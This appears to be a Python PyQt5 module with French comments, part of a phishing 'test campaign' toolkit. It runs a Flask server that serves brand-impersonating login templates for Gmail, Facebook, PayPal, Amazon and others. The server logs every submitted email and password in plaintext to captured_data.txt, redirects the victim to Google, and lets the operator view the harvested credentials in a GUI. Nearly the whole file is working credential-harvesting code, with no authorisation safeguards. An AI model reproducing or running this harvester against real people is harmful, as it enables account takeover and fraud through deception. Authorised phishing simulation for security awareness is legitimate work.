#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module Phishing - Génération de campagnes de test
"""

from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QPushButton, QTextEdit, QGroupBox, QLineEdit, 
                             QComboBox, QCheckBox, QMessageBox)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont
import threading
import os
import webbrowser
import subprocess
import sys
from datetime import datetime

class PhishingServer(QThread):
    """Thread pour le serveur Flask"""
    finished = pyqtSignal(str)
    
    def __init__(self, template_name, redirect_url):
        super().__init__()
        self.template_name = template_name
        self.redirect_url = redirect_url
        self.server_process = None
        
    def run(self):
        """Démarre le serveur Flask"""
        try:
            # Import Flask ici pour éviter les problèmes d'import
            from flask import Flask, request, render_template, redirect
            
            app = Flask(__name__)
            app.config['SECRET_KEY'] = 'secret-key-change-in-production'
            
            # Chemin des templates
            template_dir = os.path.join(os.path.dirname(__file__), '..', 'templates')
            app.template_folder = template_dir
            
            # Template mapping
            template_map = {
                'Gmail': 'gmail.html',
                'Facebook': 'facebook.html',
                'LinkedIn': 'linkedin.html',
                'Microsoft': 'microsoft.html',
                'PayPal': 'paypal.html',
                'Amazon': 'amazon.html'
            }
            
            template_file = template_map.get(self.template_name, 'gmail.html')
            
            @app.route('/')
            def index():
                return render_template(template_file)
            
            @app.route('/capture', methods=['POST'])
            def capture():
                # Capture les données
                email = request.form.get('email', '')
                password = request.form.get('password', '')
                
                # Log les données capturées
                log_dir = os.path.join(os.path.dirname(__file__), '..', 'logs')
                os.makedirs(log_dir, exist_ok=True)
                log_file = os.path.join(log_dir, 'captured_data.txt')
                
                with open(log_file, 'a', encoding='utf-8') as f:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"\n[{timestamp}] Template: {self.template_name}\n")
                    f.write(f"Email: {email}\n")
                    f.write(f"Password: {password}\n")
                    f.write("-" * 50 + "\n")
                
                # Redirection vers Google
                redirect_url = self.redirect_url if self.redirect_url else "https://www.google.com"
                return redirect(redirect_url)
            
            # Démarrer le serveur
            app.run(host='127.0.0.1', port=8080, debug=False, use_reloader=False)
            
        except ImportError:
            self.finished.emit("ERREUR: Flask n'est pas installé. Exécutez: pip install flask")
        except Exception as e:
            self.finished.emit(f"Erreur: {str(e)}")
    
    def stop(self):
        """Arrête le serveur"""
        if self.server_process:
            self.server_process.terminate()

class PhishingModule(QWidget):
    """Module de phishing pour les tests de sécurité"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.server_thread = None
        self.init_ui()
        
    def init_ui(self):
        """Initialise l'interface utilisateur"""
        main_layout = QVBoxLayout()
        
        # En-tête
        header = self.create_header()
        main_layout.addWidget(header)
        
        # Configuration
        config = self.create_config_section()
        main_layout.addWidget(config)
        
        # Prévisualisation
        preview = self.create_preview_section()
        main_layout.addWidget(preview)
        
        # Actions
        actions = self.create_actions_section()
        main_layout.addWidget(actions)
        
        self.setLayout(main_layout)
        
    def create_header(self):
        """Crée l'en-tête du module"""
        header_box = QGroupBox()
        layout = QHBoxLayout()
        
        title = QLabel("Module Phishing")
        title_font = QFont()
        title_font.setPointSize(18)
        title_font.setBold(True)
        title.setFont(title_font)
        
        btn_back = QPushButton("← Back")
        btn_back.clicked.connect(lambda: self.parent().parent().stacked_widget.setCurrentIndex(0))
        
        layout.addWidget(btn_back)
        layout.addWidget(title, alignment=Qt.AlignCenter)
        layout.addStretch()
        
        header_box.setLayout(layout)
        return header_box
        
    def create_config_section(self):
        """Crée la section de configuration"""
        config_box = QGroupBox("Configuration de la campagne")
        layout = QVBoxLayout()
        
        # Template
        template_layout = QHBoxLayout()
        template_layout.addWidget(QLabel("Template:"))
        self.template_combo = QComboBox()
        self.template_combo.addItems([
            "Gmail",
            "Facebook",
            "LinkedIn",
            "Microsoft",
            "PayPal",
            "Amazon"
        ])
        template_layout.addWidget(self.template_combo)
        layout.addLayout(template_layout)
        
        # URL cible
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("URL cible:"))
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Entrez l'URL de la page de phishing (ex: https://site.com/phishing)")
        url_layout.addWidget(self.url_input)
        layout.addLayout(url_layout)
        
        # URL de redirection
        redirect_layout = QHBoxLayout()
        redirect_layout.addWidget(QLabel("URL de redirection:"))
        self.redirect_input = QLineEdit()
        self.redirect_input.setText("https://www.google.com")
        redirect_layout.addWidget(self.redirect_input)
        layout.addLayout(redirect_layout)
        
        # Options
        self.option_open_browser = QCheckBox("Ouvrir automatiquement le navigateur")
        self.option_open_browser.setChecked(True)
        layout.addWidget(self.option_open_browser)
        
        config_box.setLayout(layout)
        return config_box
        
    def create_preview_section(self):
        """Crée la section de prévisualisation"""
        preview_box = QGroupBox("Prévisualisation")
        layout = QVBoxLayout()
        
        self.preview_text = QTextEdit()
        self.preview_text.setReadOnly(True)
        self.preview_text.setMaximumHeight(200)
        self.preview_text.setPlainText("Aucune prévisualisation disponible pour le moment.")
        
        layout.addWidget(self.preview_text)
        preview_box.setLayout(layout)
        return preview_box
        
    def create_actions_section(self):
        """Crée la section des actions"""
        actions_box = QGroupBox("Actions")
        layout = QHBoxLayout()
        
        btn_start = QPushButton("Démarrer le serveur")
        btn_start.clicked.connect(self.start_server)
        layout.addWidget(btn_start)
        
        self.btn_stop = QPushButton("Arrêter le serveur")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        layout.addWidget(self.btn_stop)
        
        btn_view_logs = QPushButton("Voir les logs")
        btn_view_logs.clicked.connect(self.view_logs)
        layout.addWidget(btn_view_logs)
        
        layout.addStretch()
        
        actions_box.setLayout(layout)
        return actions_box
        
    def start_server(self):
        """Démarre le serveur de phishing"""
        template = self.template_combo.currentText()
        redirect_url = self.redirect_input.text() if self.redirect_input.text() else "https://www.google.com"
        
        self.preview_text.setPlainText(
            f"Démarrage du serveur...\n"
            f"Template: {template}\n"
            f"URL de redirection: {redirect_url}\n"
            f"Serveur: http://127.0.0.1:8080"
        )
        
        # Démarrer le serveur dans un thread séparé
        self.server_thread = PhishingServer(template, redirect_url)
        self.server_thread.finished.connect(self.on_server_error)
        self.server_thread.start()
        
        # Activer le bouton stop
        self.btn_stop.setEnabled(True)
        
        # Ouvrir le navigateur si demandé
        if self.option_open_browser.isChecked():
            import time
            time.sleep(1)  # Attendre que le serveur démarre
            webbrowser.open('http://127.0.0.1:8080')
        
        self.preview_text.append("\n✓ Serveur démarré avec succès!")
        self.preview_text.append("Visitez: http://127.0.0.1:8080")
    
    def stop_server(self):
        """Arrête le serveur"""
        if self.server_thread:
            self.server_thread.stop()
            self.server_thread = None
            self.btn_stop.setEnabled(False)
            self.preview_text.append("\n✓ Serveur arrêté")
    
    def on_server_error(self, message):
        """Callback d'erreur du serveur"""
        self.preview_text.setPlainText(f"ERREUR: {message}")
        QMessageBox.critical(self, "Erreur", message)
    
    def view_logs(self):
        """Affiche les logs des données capturées"""
        log_file = os.path.join(os.path.dirname(__file__), '..', 'logs', 'captured_data.txt')
        
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            if content:
                self.preview_text.setPlainText("=== LOGS DES DONNÉES CAPTURÉES ===\n\n" + content)
            else:
                self.preview_text.setPlainText("Aucune donnée capturée pour le moment.")
        else:
            self.preview_text.setPlainText("Aucun fichier de log trouvé.")

